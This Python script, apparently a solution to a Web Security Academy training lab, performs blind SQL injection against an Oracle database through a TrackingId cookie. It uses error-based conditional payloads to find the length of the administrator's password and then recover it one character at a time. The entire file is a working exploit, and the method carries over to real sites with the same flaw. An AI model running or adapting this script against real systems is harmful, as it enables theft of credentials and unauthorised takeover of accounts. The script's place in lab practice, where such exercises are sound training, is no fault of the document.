import requests

url = 'https://0a4b00be035bd635808208f1002f0027.web-security-academy.net/filter?category=Gifts'
char='asdfghjklqwertyuiopzxcvbnm1234567890!@#$%^&*()_+=-'


def findLength():
    
    for i in range(1,101):
        cookie={
        'TrackingId':'90pEHwmGN2gdmbz6', 'session':'NPMUqQYtpjCuWcI1JnroBgUXZl4pcTPs'
    }
        payload = f"'||(SELECT CASE WHEN (LENGTH((SELECT+password+FROM+users+WHERE+username%3d'administrator'))={i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
        cookie['TrackingId']+=payload
        r=requests.get(url=url,cookies=cookie)
        print(f'running { r.status_code} .....')
        if(r.status_code==500):
            print(f'the length of password is : {i}')
            return i 
            break

def findpass(length):
    pwd=''
    
    for i in range(1,length+1):
        print('cracking password...')
        for c in char:
            cookie={
            'TrackingId':'90pEHwmGN2gdmbz6', 'session':'NPMUqQYtpjCuWcI1JnroBgUXZl4pcTPs'
        }
            payload = f"'||(SELECT CASE WHEN (SUBSTR((SELECT+password+FROM+users+WHERE+username%3d'administrator'), {i}, 1)='{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
            cookie['TrackingId']+=payload
            r=requests.get(url=url,cookies=cookie)
            if(r.status_code==500):
                pwd+=c                
                print(f'{pwd}')
                break
    print(f'\n password is : {pwd}')

len=findLength()
print('\nnow finding the password .. \n')
findpass(length=len)


